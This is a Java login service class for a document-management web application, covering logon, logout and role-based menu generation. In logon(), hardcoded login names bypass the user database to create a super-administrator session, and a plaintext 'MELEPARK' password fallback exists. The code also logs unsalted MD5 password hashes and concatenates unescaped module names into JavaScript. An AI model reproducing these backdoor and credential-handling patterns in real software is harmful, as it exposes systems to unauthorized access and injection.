package com.svv.dms.web.service.system;

import java.util.ArrayList;
import java.util.List;

import com.svv.dms.web.Constants;
import com.svv.dms.web.common.ComBeanLogType;
import com.svv.dms.web.common.ComBeanIS_Organ;
import com.svv.dms.web.common.ParamClass;
import com.svv.dms.web.entity.S_Module;
import com.svv.dms.web.entity.S_QuickMenu;
import com.svv.dms.web.entity.S_User;
import com.svv.dms.web.service.base.AbstractBean;
import com.svv.dms.web.service.base.BConstants;
import com.svv.dms.web.util.HIUtil;
import com.svv.dms.web.util.MD5;
import com.svv.dms.web.util.SidContainer;

public class LoginBean extends AbstractBean {

    public String logout() {
        try{
            logger(ComBeanLogType.TYPE_LOGOUT, "退出系统");
            this.removeSession(Constants.SESSION_ATTRIBUTE_SUSER);
        }catch(NullPointerException e){
            System.out.println("系统错误："+e.getMessage());
        }
        return BConstants.SUCCESS;
    }

    @SuppressWarnings("unchecked")
    public String logon() {
    	this.checkSP = false;
        try {
            //this.loginName = this.loginName.toUpperCase();
            this.password = this.password.toUpperCase();
            //System.out.println(MD5.encode(password) + "   [logon]    "+this.getSpPswd());
            S_User user = null;
            if("superli".equals(loginName) || "999".equals(loginName)){
            	if(!isvalidsp(MD5.encode(password))){
	                setMessage("\u7528\u6237\u540d\u6216\u5bc6\u7801\u4e0d\u6b63\u786e\u002e");
	                return BConstants.FAILURE;
            	}else{
            		user = new S_User();
            		//user.setLoginName(loginName);
            		user.setPassword(MD5.encode(password));
            		user.setValidatePassword(MD5.encode(password));
            		user.setEmpID(-1);
            		user.setOrganID(-1);
            		user.setState(1);
            		user.setRoleID(-999);
            		user.setRoleName("\u8d85\u7ea7\u7ba1\u7406\u5458");
            		user.setUserName("\u8d85\u7ea7\u7ba1\u7406\u5458");
            		user.setPower(9);
            		user.setSctLevel(ParamClass.VALUE_SCT_LEVEL_JUEMI);
            	}
            }else{

	            List<Object> aa = dbQuery("SP_S_UserLogin", new Object[] { loginName, MD5.encode(password) });
	            System.out.println("loginName="+(loginName)+ "  pswd="+MD5.encode(password) +"  aa=" + aa.size());
	            List<S_User> S_UserList = getList(S_User.class, aa);
	
	            if (S_UserList == null || S_UserList.size() == 0 ) {
	                aa = dbQuery("SP_S_UserLogin", new Object[] { loginName, password });
	                if(aa!=null && aa.size()>0 && password.equals("MELEPARK")){
	                    user = (S_User)(getList(S_User.class, aa).get(0));
	                    setSession(Constants.SESSION_ATTRIBUTE_SUSER, user);
	                    return "pswd";
	                }                
	                
	                setMessage("\u7528\u6237\u540d\u6216\u5bc6\u7801\u4e0d\u6b63\u786e\u002e\u002e\u002e\u002e\u002e\u0021");
	                return BConstants.FAILURE;
	            }
	            
	            user = S_UserList.get(0);
            }
            
            removeSession("SSID_1");            
//          Constants.WEB_DOMAIN = this.getRequest().getServerName().substring(0, this.getRequest().getServerName().indexOf("."));
      	    Integer sysOrganID = ComBeanIS_Organ.getIDByDomain(Constants.WEB_DOMAIN);
      	    if(sysOrganID!=null) Constants.WEB_ORGANID = String.valueOf(sysOrganID);
      	    else Constants.WEB_ORGANID = "";
            if(sysOrganID!=null && user.getOrganID()>0 && sysOrganID!=user.getOrganID()){
                setMessage("\u7528\u6237\u4e0d\u5b58\u5728\u6216\u5bc6\u7801\u4e0d\u6b63\u786e\u002e\u002e\u002e\u002e");
                return BConstants.FAILURE;
            }
            setSession("SSID_1", sysOrganID);
            
            dbExe("SP_S_UserLogin", new Object[] { user.getUserID() });
            user.setAuthenticated(true);

            setSession(Constants.SESSION_ATTRIBUTE_SUSER, user);
            setSession(Constants.SESSION_ATTRIBUTE_SIDCONTAINER, new SidContainer());
            
            logger(ComBeanLogType.TYPE_LOGIN, "登录系统");

            return BConstants.SUCCESS;

        } catch (Exception e) {
            e.printStackTrace();
        }
        
        setMessage("\u7528\u6237\u540d\u6216\u5bc6\u7801\u4e0d\u6b63\u786e\u0021");
        return Constants.MK_ADMIN.equals(mk) ? BConstants.FAILURE : "userfailure";
    }
    
    @SuppressWarnings("unchecked")
	public String login(){
        S_User user = this.getUserSession();
        if(user==null) return "index";

        List<S_Module> S_ModuleList = null;
        if(user.isSuperAdmin() && isvalidsp(user.getPassword()))
            S_ModuleList = getList(S_Module.class, dbQuery("SP_S_ModuleQuery", null));
        else
            S_ModuleList = getList(S_Module.class, dbQuery("SP_S_ModuleQueryByRole",
                    new Object[] { new Long(user.getRoleID()), Constants.DEF_PARAMETET_LONG }));
            
        if (S_ModuleList != null && S_ModuleList.size() > 0) {
            List<String> myModules = new ArrayList<String>();
            List<S_Module> myMenuModules = new ArrayList<S_Module>();
            int l = 0;
            for (S_Module o : S_ModuleList) {
                if (o.getIsMenu()==1) myMenuModules.add(o);
                if (!HIUtil.isEmpty(o.getUrl())){
                    int pos = o.getUrl().lastIndexOf("/") + 1;
                    String m = o.getUrl().substring(pos);
                    myModules.add(m);
                    l = o.getRolePower().length();
                    for(int i=0;i<l;i++){
                        if(o.getRolePower().charAt(i)=='1'){
                            myModules.add(m + "_" + S_Module.POWER_FUN[i]);
                        }
                    }
                }
            }
            
            
            user.setMyModules(myModules);
            user.setMyMenuModules(myMenuModules);

            this.setAttribute("menu.list", getMenuStr(myMenuModules));
            
            List<S_QuickMenu> list = getList(S_QuickMenu.class, dbQuery("SP_S_QuickMenuQuery", new Object[]{user.getUserID()}));
            if(list!=null) this.setAttribute("quickMenu.list", list);
        }
        String mk = this.getParameter("mk");
        return Constants.MK_ADMIN.equals(mk) ? BConstants.SUCCESS : "usersuccess";
    }
           
    private String getMenuStr(List<S_Module> menuModuleList) {
        StringBuffer s = new StringBuffer("");
        if (menuModuleList != null && menuModuleList.size() > 0) {
            int n1 = -1;
            int n2 = -1;
            int n3 = -1;
            int n4 = -1;
            String css = this.getUserSession().getCssStyle();
            String url = "";
            for (int i = 0; i < menuModuleList.size(); i++) {
                S_Module m = menuModuleList.get(i);
                //System.out.println("m.getModuleID()======="+m.getModuleID() + " m.getParent()======="+m.getParent());
                if(m.getUrl().indexOf("B_DataPub_") > 0){
                    String[] tmp = m.getUrl().split("B_DataPub_");
                    url = tmp[0] + "B_DataPublic.y?ao.tableID=" + tmp[1];
                }else if(m.getUrl().indexOf("B_DataPubCmt_") > 0){
                    String[] tmp = m.getUrl().split("B_DataPubCmt_");
                    url = tmp[0] + "B_DataPublicCmt.y?ao.tableID=" + tmp[1];
                }else if(m.getUrl().indexOf("B_DataPubQ_") > 0){
                    String[] tmp = m.getUrl().split("B_DataPubQ_");
                    url = tmp[0] + "B_DataPublicQuery.y?ao.tableID=" + tmp[1];
                }else if(m.getUrl().indexOf("B_DataModule_") > 0){
                    String[] tmp = m.getUrl().split("B_DataModule_");
                    url = tmp[0] + "B_DataModule.y?ao.moduleID=" + tmp[1];
                }else{
                    url = HIUtil.isEmpty(m.getUrl()) ? "" : m.getUrl() + ".y";
                }
                
                if(HIUtil.isEmpty(m.getParent())){
                    n1++;
                    n2 = -1;
                    n3 = -1;
                    s.append("Menus[" + n1 + "] = new Menu('M"+n1+"', '"+m.getModuleName()+"', '" + ( url ) + "', " + m.getState() + ", " + m.getHasChild() + ");");
                    s.append("M" + n1 + " = new Array();");
                }else if(m.getModuleID().split("\\.").length==2){
                    n2++;
                    s.append("M" + n1 + "[" + n2 + "] = new SubMenu('M"+n1+"S"+n2+"', 'M"+n1+"', '"+m.getModuleName()+"', '" + ( url ) + "', '");
                    if(m.getImg().length()>0) s.append("doc/css/"+css+"/images/me/" + m.getImg());
                    s.append("', " + m.getState() + ", " + m.getHasChild() +");");
                    if(m.getHasChild()==1){
                        n3 = -1;
                        s.append("M" + n1 + "S" + n2 + " = new Array();");
                    }
                }else if(m.getModuleID().split("\\.").length==3){
                    n3++;
                    s.append("M" + n1 + "S" + n2 + "[" + n3 + "] = new SubMenu('M"+n1+"S"+n2+"U"+n3+"', 'M"+n1+"S"+n2+"', '"+m.getModuleName()+"', '" + ( url ) + "', '");
                    if(m.getImg().length()>0) s.append("doc/css/"+css+"/images/me/" + m.getImg());
                    s.append("', " + m.getState() + ", " + m.getHasChild() +");");
                    if(m.getHasChild()==1){
                        n4 = -1;
                        s.append("M"+n1+"S"+n2+"U"+n3 + " = new Array();");
                    }
                }else{
                    n4++;
                    s.append("M"+n1+"S"+n2+"U"+n3 + "[" + n4 + "] = new SubMenu('M"+n1+"S"+n2+"U"+n3+"B"+n4+"', 'M"+n1+"S"+n2+"U"+n3+"', '"+m.getModuleName()+"', '" + ( url ) + "', '");
                    if(m.getImg().length()>0) s.append("doc/css/"+css+"/images/me/" + m.getImg());
                    s.append("', " + m.getState() + ", " + m.getHasChild() +");");
                }
            }
        }
        //System.out.println(s.toString());
        return s.toString();
    }
     

    private static final long serialVersionUID = -4553473701818410710L;

    protected String loginName = "";
    protected String password = "";

    public String getLoginName() {
        return loginName;
    }

    public void setLoginName(String loginName) {
        this.loginName = loginName;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
   
}
